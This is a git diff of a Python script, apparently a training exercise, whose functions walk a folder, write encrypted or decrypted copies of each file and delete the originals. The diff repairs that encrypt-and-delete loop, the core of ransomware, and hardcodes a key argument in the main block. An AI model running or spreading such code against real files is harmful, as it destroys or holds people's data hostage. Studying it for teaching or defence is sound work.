@@ -1,5 +1,5 @@
-#!/usr/bin/python3
 #!/Users/lcasado-/miniconda3/envs/42AI-stockholm/bin/python
+#!/usr/bin/python3
 #!/home/luis/anaconda3/envs/42AI-stockholm/bin/python
 
 import os
@@ -96,9 +96,9 @@ def recursive_encrypt(folderpath, silence):
 
                 with open(os.path.join(root, file), 'rb') as infile:
                     incontent = infile.read()
-                    uncipheredcontent = decrypt_content(incontent)
+                    cipheredcontent = encrypt_content(incontent)
                     with open(os.path.join(root, fileout), 'wb') as outfile:
-                        outfile.write(uncihperedcontent)
+                        outfile.write(cipheredcontent)
                 os.remove(os.path.join(root, file))
                 #try:
 
@@ -125,9 +125,9 @@ def recursive_reverse(folderpath, silence):
                 fileout = file_name
                 with open(os.path.join(root, file), 'rb') as infile:
                     incontent = infile.read()
-                    ciperedcontent = deencrypt_content(incontent)
+                    unciperedcontent = decrypt_content(incontent)
                     with open(os.path.join(root, fileout), 'wb') as outfile:
-                        outfile.write(incontent)
+                        outfile.write(unciperedcontent)
                 os.remove(os.path.join(root, file))
                 #try:
 
@@ -209,7 +209,8 @@ def create_argument_parser():
 if __name__ == "__main__":
     
     parser = create_argument_parser()
-    args = parser.parse_args(sys.argv[1:])
+    #args = parser.parse_args(sys.argv[1:])
+    args = parser.parse_args(['-r', 'U7m7sfudf96edFqZNzkrFw5qNce6YLJ7LYdTTsq2YM8='])
     print("Estos son mis argumentos ", args)
     
     silence = False
